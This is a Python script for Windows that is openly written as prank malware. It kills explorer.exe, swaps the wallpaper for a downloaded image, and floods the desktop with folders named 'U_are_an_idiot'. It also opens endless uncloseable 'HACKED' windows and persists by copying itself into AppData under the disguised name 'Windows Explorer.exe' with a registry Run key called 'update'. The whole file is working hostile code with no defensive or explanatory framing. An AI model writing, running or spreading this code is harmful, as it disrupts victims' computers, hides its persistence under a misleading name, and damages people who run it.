from tkinter import *
import threading
import time
import ctypes
import random
import sys
import subprocess
import shutil
import os
import requests
from PIL import Image

cmd = 'taskkill /F /IM explorer.exe'

def become_persistent():
    evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(evil_file_location):
        shutil.copyfile(sys.executable, evil_file_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

def create_directories_on_desktop():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for i in range(1, 999999999999): 
        directory_name = f"U_are_an_idiot_{i}"
        directory_path = os.path.join(desktop_path, directory_name)
        os.makedirs(directory_path)

def disable_event():
    pass

def download_image(url):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open("wallpaper.jpg", 'wb') as f:
            for chunk in response:
                f.write(chunk)

def set_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20
    WALLPAPER_PATH = image_path.encode('utf-16le')
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)

def move_window():
    root = Tk()
    root.title('HACKED')
    root.attributes('-toolwindow', True)

    x = random.randint(0, 999)
    y = random.randint(0, 999)
    root.resizable(0,0)
    root.geometry(f'235x200+{x}+{y}')
    root.configure(background='black')

    Label(root, text='HACKED', fg='white', bg='black').place(x=50, y=20) 

    Label(root, text='You are an idiot', fg='red', bg='black').place(x=20, y=10)    

    root.protocol("WM_DELETE_WINDOW", disable_event)

    root.mainloop()

if __name__ == "__main__":
    image_url = "https://th.bing.com/th/id/R.20f4c983df6019de61ec37453a91df68?rik=NGmr7s%2bqgPOkOQ&riu=http%3a%2f%2fgetwallpapers.com%2fwallpaper%2ffull%2f4%2f7%2fa%2f385669.jpg&ehk=Exr4CPBJYx4i4edPA7LScn%2fAR%2fAJRogSW871lTk4sZQ%3d&risl=&pid=ImgRaw&r=0"

    download_image(image_url)
    set_wallpaper("wallpaper.jpg")

    subprocess.run(cmd, shell=True)
    create_directories_on_desktop()

    while True:
        thread = threading.Thread(target=move_window)
        thread.start()
        become_persistent()
